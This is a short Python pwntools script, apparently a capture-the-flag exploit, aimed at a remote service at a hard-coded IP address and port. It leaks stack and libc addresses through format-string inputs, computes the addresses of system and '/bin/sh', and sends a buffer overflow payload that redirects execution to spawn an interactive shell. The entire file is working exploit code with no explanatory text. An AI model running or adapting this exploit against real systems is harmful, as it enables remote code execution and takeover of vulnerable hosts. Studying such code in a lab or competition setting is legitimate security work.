from pwn import *
context.log_level ='DEBUG'
p = remote('47.99.176.38',5210)
#p = process('./main')
p.recvuntil("Input your name:")
p.send("%17$p")
ret_esp = int(p.recv(10),16)
PI='\x00'*0x24 + p32(ret_esp +0x70 + 4)
p.send(PI)
p.recvuntil("Input your name:")
p.send('%25$p')
libc_base=int(p.recv(10),16)-0x1E2880
one=libc_base+0x3AC69
system = libc_base +  0x03ADA0
binsh = libc_base +  0x15BA0B
offset = ret_esp + 0x40 + 4
log.info('Ret:\tOFF:\t\n' + hex(ret_esp) + '\t' + hex(offset))
log.info('LIBC:\t' + hex(libc_base))
p.recvuntil('Input your info:')
PII = p32(system) + p32(0) + p32(binsh)
PII = PII.ljust(0x24,'\x00')
PII +=p32(offset)
p.send(PII)

p.interactive()

